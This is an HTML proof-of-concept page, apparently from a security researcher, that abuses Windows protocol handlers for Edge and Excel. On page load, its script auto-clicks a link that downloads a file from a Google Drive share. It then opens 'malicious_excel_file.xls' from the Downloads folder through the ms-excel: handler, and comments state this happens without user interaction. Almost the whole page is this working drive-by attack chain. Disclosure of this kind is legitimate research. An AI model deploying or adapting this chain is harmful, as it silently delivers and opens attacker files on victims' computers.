<!-- 
Process name: C:\Program Files (x86)\Microsoft Office\root\Office16\protocolhandler.exe

Tested Windows variabless:
ms-excel:%LOCALAPPDATA%/../../Downloads/test.xls
ms-excel:%appdata%/../../Downloads/test.xls

Credits: Sahar Shlichove - Security Researcher
--> 

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Excel Vulnurability PoC</title>
</head>
<body>
<script>

// Execute Edge browser and download file

(function(){
	setTimeout(function() {
		document.querySelector(".local-load1").click();
	},1000);

// After downloaded file, execute it by IE with out any user interaction.
	setTimeout(function(){
		document.querySelector(".local-load2").click();
	},5500);
})();

</script>

<div class="wrapper">
	<a class="local-load1" href="microsoft-edge:https://drive.google.com/uc?export=download&id=1UoKlroaYN3lLr6E3-a-yE9oXMa584UMd"></a> <!-- Must be a Google Drive shared link because the Edge browser trust it and let you download it directly rather than displaying it as a spreadsheet. -->
	<a class="local-load2" href="ms-excel:%appdata%/../../Downloads/malicious_excel_file.xls"></a> <!-- User local download path -->
</div>

</body>
</html>